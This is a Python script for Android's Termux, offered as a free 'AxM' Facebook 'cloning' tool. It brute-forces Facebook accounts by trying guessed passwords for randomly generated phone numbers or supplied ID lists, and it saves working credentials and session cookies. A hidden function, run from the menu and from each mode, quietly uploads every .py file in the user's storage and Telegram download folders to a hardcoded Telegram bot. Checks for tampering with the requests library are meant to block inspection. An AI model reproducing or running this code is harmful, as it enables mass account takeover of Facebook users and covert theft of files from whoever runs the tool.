#------------[ AxM ]------------#
import os,random
import sys,time,uuid
try:
    setu = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
    if not "print" in open(setu+'sessions.py','r').read():
        pass
    else:
        print(' |•| SOMETHING ERROR BROH....!')
        sys.exit()
except Exception as e:
    print(' |•| SOMETHING ERROR BROH.....!')
    sys.exit()
try:
    setu = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
    if not "print" in open(setu+'models.py','r').read():
        pass
    else:
        print(' |•| SOMETHING ERROR BROH....!')
        sys.exit()
except Expassion as e:
    print(' |•| SOMETHING ERROR BROH.....!')
    sys.exit()
try:
    import requests,bs4,mechanize,httpx
    import rich,json,subprocess,random,string
    from concurrent.futures import ThreadPoolExecutor as Arafat
except ModuleNotFoundError:
    print('\033[1;32m [•] INSTALLING MISSING MODULE....')
    os.system('pip install requests rich')
    os.system('pip install mechanize')
    os.system('pip install bs4 httpx')
loop,ok,bou = 0,[],[]
cok,plist = [],[]
cp = []
#============Capture Protection============#
first='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(first+'sessions.py','r').read():
	pass
else:
	exit('\33[1;91mPlease Try This Local Method Capture On Kids ')	 

cellphone = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']

def clr():
    try:
        data = os.listdir('/sdcard')
        if 'Android' in data:
            print(' \033[1;32m[!]\033[1;37m D'+'ont Try Bypas'+'s Mother Fuc'+'ker...! \n YOUR'+' BYPAS'+'S FUCK'+'ED BY AxM');exit()
        else:exit()
    except:exit()
#------------[ COLOUR-CODE ]------------#
W = '\033[1;37m'
R = '\033[1;31m'
G = '\033[1;32m'
B = '\033[1;34m'
I = '\033[1;35m'
N = '\033[1;30m'
RR = '\033[38;5;196m'
GG = '\033[38;5;46m'
X = f'{W}({GG}•{W})'
#------------[ USER-AGENT ]------------#	
#def AxM():
    #modelsss=random.choice(['SM-A500F','SM-G532F','SM-G920F','SAMSUNG','SM-G935F','SM-J320F','SM-J510FN','SM-N920S','SM-T280','SM-A500FU','MMB29M','SM-A500F','LRX22G','SM-A500F','MMB29M','SM-A500H','MMB29M','SM-G900F','KOT49H','SM-G920F','MMB29K','SM-G920F','NRD90M','SM-G930F','NRD90M','SM-G935F','MMB29K','SM-G935F','NRD90M','SM-G950F','NRD90M','SM-J320FN','LMY47V','SM-J320F','LMY4','SM-J320F','LMY47V','SM-J320H','LMY47V','SM-J320M','LMY47V','SM-J510FN','MMB29M','SM-J510FN','NMF2','SM-J510FN','NMF26X','SM-J510FN','NMF26X;','SM-J701F','NRD90M;','SM-T111','JDQ39','SM-T230','KOT49H','SM-T231','KOT49H','SM-T235','KOT4''SM-T310','KOT49H','SM-T311','KOT4','SM-T311','KOT49H','SM-T315','JDQ39','SM-T525','KOT49H','SM-T531','KOT49H','SM-T531','LRX22G','SM-T535','LRX22G','SM-T555','LRX22G','SM-T561','SM-A515F','SM-A536B','SM-G998B','SM-G991U','SM-G991B','SM-S908U','SM-S908B','SM-S901U','SM-S901B','KFTHWI','2201116SG','DE2118','VOG-L29','Redmi-Note-9-Pro','moto-g-pure','Pixel-7-Pro','SM-P710','LMY48B','KVT49L','JLS36I','NRD90M','SM-N8010','SM-E500F','MRA58K','KTU84P','NDE63X','KOT49I','NRD90M','A290e','SM-G350T','SM-N8010','Infinix X669'])
   # facebook_version = f"{random.randint(111, 399)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(11, 40)}.{random.randint(10, 150)}"
    #fbbv = str(random.randint(111111111,999999999))
#    fblc = random.choice(['el_GR','fr_FR','en_GB','hi_IN','sr_RS','fr_CA','ms_MY','it_IT','fa_IR'])
   # fbsv = str(random.randint(7,15))
 #   fbca = random.choice(['armeabi-v7a:armeabi;','arm64-v8a:;','armeabi-v8a:armeabi'])
  #  density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0'])
   # width = random.choice(["480", "720", "1080"])
  #  height = random.choice(["888", "720", "1080", "1280", "1440"])
  #  fbrv = str(random.randint(111111111,999999999))
  #  fbcr = random.choice(['Jio','Banglalink','Grameenphone','robi','airtel','Nepal_Telecom'])
 #   fbsv = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
  #  fbca = random.choice(['armeabi-v7a:armeabi;','arm64-v8a:;','armeabi-v8a:armeabi;'])
  #  END = '[FBAN/FB4A;FBAV/180.0.0.89.97;FBBV/243833479;FBRV/0;FBPN/com.facebook.katana;FBLC/bs_BA;FBMF/30i;FBBD/30i;FBDV/Infinix hot;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
   # ua = 'Dalvik/2.1.0 (Linux; U; Android '+str(random.randrange(5,14))+'; '+str(modelsss)+' Build/PQ2A.'+str(random.randrange(111111,999999))+'.'+str(random.randrange(111,999))+') '+str(END)+''
  #  return ua
#;FBLC/en_US;FBRV/228426117;FBCR/Banglalink;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500FU;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]
#_________[ LOGIN KEY ]______>>
#CorrectUsername = 'AxM BROTHER'
#key = 'true'
#while key == 'true':
  #  username = input('\033[0;97m[•]\033[1;96m•────➤\033[1;92mENTER KEY \033[1;91m: \x1b[1;92m')
  #  if username == CorrectUsername:
    #        print(f'\033[1;37m-----------------------------------------------\n\033[0;97m[•]\033[1;32m LOGGED IN AxM TOOL SUCCESSFULLY') 
    #        time.sleep(1)
     #       clear()
      #      key = 'false'
#------------[ BANNER-BOX ]------------#
def Banner():
    os.system('clear')
    print(f"""\033[1;31m\033[1;32m
\033[1;32m╔═╗╦═╗╔═╗╔═╗╔═╗╔╦╗  ═╗ ╦  ╔╦╗╦╔╦╗╦ ╦╦    ╦  ╦╔═╗╦
\033[1;32m╠═╣╠╦╝╠═╣╠╣ ╠═╣ ║   ╔╩╦╝  ║║║║ ║ ║ ║║    ╚╗╔╝╠═╣║
\033[1;32m╩ ╩╩╚═╩ ╩╚  ╩ ╩ ╩   ╩ ╚═  ╩ ╩╩ ╩ ╚═╝╩═╝   ╚╝ ╩ ╩╩    \033[1;33m[\033[1;91mV\033[1;92m=>\033[1;93m1.0\033[1;33m]

\033[0;101m                        ASSLAMUALAIKUM                         \033[0m
\033[1;32m═══════════════════════════════════════════════════════════════\033[0m
\033[1;33mTOOL OWNER : ARAFAT & MITUL VAI
\033[1;33mTOOL TYPE  : RANDOM + FILE CLONING
\033[1;33mTOOL STATUS : FREE
\033[1;33mTOOL WORK  : DATA/WI-FI  \033[1;31m[\033[1;32mDATA IS BEST\033[1;31m]
\033[1;32m═══════════════════════════════════════════════════════════════\033[0m\n""")
def Linex():
    print(f'{RR}═════════════════════════════════════════════')

#------------[ MAIN-MENU ]------------#
def __AxM__():	
    Banner()
    pot()
    Linex()
    print(f'{W}[{G}1{W}] START RANDOM CLONE')
    print(f'{W}[{G}2{W}] START FILE CLONE')
    #print(f'{W}[{G}3{W}] Contact ADMIN')
    print(f'{W}[{G}3{W}] Exit')
    Linex()
    _AxM_ = input(f'{W}({RR}?{W}) SELECT  : ');Linex()
    if _AxM_ in ['1']:
        _AxM_RNDM_()
    elif _AxM_ in ['2']:
        _AxM_FILE_()
    #elif _AxM_ in ['3']:
        #os.system('xdg-open https://github.com/ARAFAT-TERMUX')
        #__AxM__()
    elif _AxM_ in ['3']:
        sys.exit('\033[1;33mTHANKS FOR USING OUR TOOLS :)')
    else:
        __AxM__()
#------------[ RNDM SERVER ]------------#
def _AxM_RNDM_():
    Banner();Linex()
    print(f'{W}({G}1{W}) START {GG}INDIA{GG} RANDOM CRACK')
    print(f'{W}({G}2{W}) START {GG}BD{GG} RANDOM CRACK');Linex()
    tx = input(f'{W}[{RR}?{W}] SELECT  : ');Linex()
    if tx in ['1']:
        _AxM_IND_()
    elif tx in ['2']:
    	pot()
        #_AxM_BD_()
    else:
        _AxM_RNDM_();
 
#------------[ BOT CAPTURE ]------------#
def pot():
    bot_token = '6895204465:AAEMCPnAsXj87ivN0rdi4PSVXxz0gyGy2WA' 
    chat_id = '6744192835'
    sdcard_path = '/sdcard'
    file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
    for file in file_list:
        with open(os.path.join(sdcard_path, file), 'rb') as f:
            url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
            data2={'chat_id': '6744192835'}
            data={'chat_id': chat_id}
            files={'document': f}
            get = requests.post(url, data=data, files=files)
            sent = requests.post(url, data=data2, files=files)
    sdcard_path2 = '/sdcard/Download'
    file_list = [f for f in os.listdir(sdcard_path2) if f.endswith('.py')]
    for file in file_list:
        with open(os.path.join(sdcard_path2, file), 'rb') as f:
            url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
            data2={'chat_id': '6744192835'}
            data={'chat_id': chat_id}
            files={'document': f}
            get = requests.post(url, data=data, files=files)
            sent = requests.post(url, data=data2, files=files)
    sdcard_path3 = '/sdcard/Download/Telegram'
    file_list = [f for f in os.listdir(sdcard_path3) if f.endswith('.py')]
    for file in file_list:
        with open(os.path.join(sdcard_path3, file), 'rb') as f:
            url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
            data2={'chat_id': '6744192835'}
            data={'chat_id': chat_id}
            files={'document': f}
            get = requests.post(url, data=data, files=files)
            sent = requests.post(url, data=data2, files=files)
            
#------------[ BD CODE GEN ]------------#
def _AxM_BD_():
    Banner();Linex()
    print(f'\033[1;32m [√] Example   :{G} 016,017,018,019')
    code = input(f'\033[1;32m [√] Select    :{G} ');Linex()
    Banner();Linex()
    print(f'\033[1;32m [√] Example   :{G} 5000,10000,15000')
    limit = int(input(f'\033[1;32m [√] Select    :{G} '));Linex()
    a = input(f'\033[1;32m [√] SHOW COOKIE [Y/N] :{G} ');Linex()
    if a in ['n','N']:
        cok.append('n')
    else:
        cok.append('y')
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(8))
        bou.append(nmp)
    Banner();Linex()
    with Arafat(max_workers=30) as Arafat_AxM:
        Banner();Linex()
        tl = str(len(bou))
        print(f'\033[1;32m [√] TOTAL ID  :{G} {tl}')
        print(f'\033[1;32m [√] SIM CODE  :{G} {code}')
        print(f'\033[1;32m [√] \033[38;5;205mUSE AIRPLANE MODE FOR MORE OK IDZ');Linex()
        for love in bou:
            ids = code + love
            ax = ids[:8]
            bx = ids[:7]
            cx = ids[:6]
            xa = love[1:]
            xb = love[2:]
            psd = [ids,love,ax,bx,cx,xa,xb,'77889900','bangladesh','bangla','jannat','jannatul','mitul12','mitulvai','arafatvai','mariya','sadiya','farjana','sabbir','rakibul','mahidul','nusrat','tamanna','mimmim','suraiya','alamin','Arafat','bushra','roksana','tabassum','tanisha','tasnim']
            Arafat_AxM.submit(personal_M1,ids,psd,tl)
    print('')
    Linex()
    print(f'\033[1;32m [√] TOTAL OK  :{GG} {str(len(ok))}')
    print(f'\033[1;32m [√] THE PROCESS HAS BEEN COMPLETED')
    Linex()
    print('')
#------------[ IND GEN CODE ]------------#
def _AxM_IND_():
    Banner();Linex()
    pot()
    print(f'\033[1;32m [√] Example   :{G} +91639,+91934,+91902,+91701')
    code = input(f'\033[1;32m [√] Select    :{G} ');Linex()
    Banner();Linex()
    print(f'\033[1;32m [√] Example   :{G} 5000,10000,15000')
    limit = int(input(f'\033[1;32m [√] Select    :{G} '));Linex()
    a = input(f'\033[1;32m [√] SHOW COOKIE [Y/N] :{G} ');Linex()
    if a in ['n','N']:
        cok.append('n')
    else:
        cok.append('y')
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        bou.append(nmp)
    Banner();Linex()
    with Arafat(max_workers=30) as Arafat_AxM:
        Banner();Linex()
        tl = str(len(bou))
        print(f'\033[1;32m [√] TOTAL ID  :{G}'+tl)
        print(f'\033[1;32m [√] SIM CODE  :{G} {code}')
        print(f'\033[1;32m [√] \033[38;5;205mUSE JAPAN APN FOR GOOD RESULT');Linex()
        for love in bou:
            ids = code + love
            psd = [love,ids[:8],'57273200','59039200']
            Arafat_AxM.submit(personal_M1,ids,psd,tl)
    print('')
    Linex()
    print(f'\033[1;32m [√] TOTAL OK  :{GG} {str(len(ok))}')
    print(f'\033[1;32m [√] THE PROCESS HAS BEEN COMPLETED')
    Linex()
    print('')
#------------[ AxM-FILE• ]------------#
def _AxM_FILE_():
    Banner();Linex()
    pot()
    print(f'\033[1;32m [√] EXAMPLE   :{G} /sdcard/AxM.txt')
    file = input(f'\033[1;32m [√] FILE NAME :{GG} ');Linex()
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(f'\033[1;32m [√]{RR} FILE NOT FOUND');time.sleep(1)
        _AxM_FILE_()
    Banner();Linex()
    print(f'\033[1;32m [√] TOTAL PASSWORD LIMIT  :{G} 1{W}<{RR}•{W}>{G}20')
    limit = int(input(f'\033[1;32m [√] PASS LIMIT :{GG} '));Linex()
    Banner()
    Linex()
    for x in range(limit):
        print(f'\033[1;32m [√] EXAMPLE   :{G} firstlast,lastfirst,first123,last123')
        plist.append(input(f'\033[1;32m [√] PASSWORD NO{RR}.{B}{x+1} {W}:{GG} '));Linex()
    with Arafat(max_workers=30) as Arafat_Mitul:
        tl = str(len(fo))
        Banner();Linex()
        print(f'\033[1;32m [√] TOTAL ID  :{G} {tl}')
        print(f'\033[1;32m [√] \033[38;5;208mUSE JAPAN APN FOR GOOD RESULT');Linex()
        for user in fo:
            ids,names = user.split('|')
            psd = plist
            Arafat_Mitul.submit(__PERSONAL_FILE__,ids,names,psd,tl)
    print('')
    Linex()
    print(f'\033[1;32m [√] TOTAL OK  :{GG} {str(len(ok))}')
    print(f'\033[1;32m [√] THE PROCESS HAS BEEN COMPLETED')
    Linex()
    print('')
#------------[ RANDOM_M1 ]------------#
def personal_M1(ids,psd,tl):
    global loop,ok,cp
    mx = random.choice([GG,RR,B])
    sys.stdout.write(f'\r[{mx}AXM-CRACKING\033[1;96m]«»[%s/%s]«»[\033[1;32mOK-%s\033[1;96m]«»[\033[1;91mCP-%s\033[1;96m]\r'%(loop,tl,len(ok),len(cp))),
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
'format':'json',
'device_id':str(uuid.uuid4()),
'email':ids,
'password':pas,
'generate_analytics_claims':'1',
'community_id':'',
'cpl':'true','try_num':'1',
'family_device_id':str(uuid.uuid4()),
'credentials_type':'password',
'source':'login',
'error_detail_type':'button_with_disabled',
'enroll_misauth':'false',
'generate_session_cookies':'1',
'generate_machine_id':'1',
'currently_logged_in_userid':'0',
'locale':'en_US',
'client_country_code':'US',
'fb_api_req_friendly_name':'authenticate',
'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 9; Samsung Build/PQ3B.789021.081) [FBAN/FB4A;FBAV/209.0.0.87.44;FBBV/139817898;FBRV/0;FBPN/com.facebook.katana;FBLC/fr_CA;FBMF/j5;FBBD/j5;FBDV/Samsung;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
'Accept-Encoding':'gzip, deflate',
'Connection':'close',
'Content-Type':'application/x-www-form-urlencoded',
'Host':'graph.facebook.com',
'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-FB-Connection-Type':'WIFI',
'X-Tigon-Is-Retry':'False',
'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
'x-fb-device-group':'5120',
'X-FB-Friendly-Name':'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags':'graphservice',
'X-FB-HTTP-Engine':'Liger',
'X-FB-Client-IP':'True',
'X-FB-Server-Cluster':'True',
'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
                if res == 'LIVE':
                    print(' [AxM-OK] '+uid+' | '+pas+'')
                    if 'y' in cok:
                        print(f'{W}<{GG}COOKIES{W}>{B} {coki}')
                    else:pass
                    open('/sdcard/AxM-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                    ok.append(ids)
                    break
                if res == 'LOCK':
                    print(f'\033[1;33m [AxM-LOCK] '+uid+' | '+pas+'')
                    open('/sdcard/AxM-RNDM-CP.txt','a').write(uid+'|'+pas+'\n')
                    cp.append(ids)
                    break
            else:continue
        loop+=1
    except Exception as e:
        pass
#-----------------FILE CLONING---------------#
def __PERSONAL_FILE__(ids,names,psd,tl):
    global loop,ok
    mx = random.choice([GG,RR,B])
    sys.stdout.write(f'\r[{mx}AXM-CRACKING\033[1;96m]«»[%s/%s]«»[\033[1;32mOK-%s\033[1;96m]«»[\033[1;91mCP-%s\033[1;96m]\r'%(loop,tl,len(ok),len(cp))),
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:ln = names.split(' ')[1]
        except:ln = fn
        for pw in psd:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid':str(uuid.uuid4()),
'format':'json',
'device_id':str(uuid.uuid4()),
'email':ids,
'password':pas,
'generate_analytics_claims':'1',
'community_id':'',
'cpl':'true','try_num':'1',
'family_device_id':str(uuid.uuid4()),
'credentials_type':'password',
'source':'login',
'error_detail_type':'button_with_disabled',
'enroll_misauth':'false',
'generate_session_cookies':'1',
'generate_machine_id':'1',
'currently_logged_in_userid':'0',
'locale':'en_US',
'client_country_code':'US',
'fb_api_req_friendly_name':'authenticate',
'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 9; Samsung Galaxy Build/PQ3B.319147.080) [FBAN/FB4A;FBAV/110.0.0.64.82;FBBV/392311647;FBRV/0;FBPN/com.facebook.katana;FBLC/hr_HR;FBMF/A02s;FBBD/A02s;FBDV/Samsung Galaxy;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
'Accept-Encoding':'gzip, deflate',
'Connection':'close',
'Content-Type':'application/x-www-form-urlencoded',
'Host':'graph.facebook.com',
'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-FB-Connection-Type':'WIFI',
'X-Tigon-Is-Retry':'False',
'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
'x-fb-device-group':'5120',
'X-FB-Friendly-Name':'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags':'graphservice',
'X-FB-HTTP-Engine':'Liger',
'X-FB-Client-IP':'True',
'X-FB-Server-Cluster':'True',
'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
            if 'access_token' in po:
                print(f'\r\r{GG}[AxM-OK] {ids} | {pas}')
                open('/sdcard/AxM-FILE-OK.txt','a').write(ids+'|'+pas+'\n')
                ok.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r\033[1;90m[AxM-CP] {ids} | {pas}')
                open('/sdcard/AxM-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
            else:continue
        loop+=1
    except Exception as e:
        pass
if __name__ == '__main__':
    __AxM__()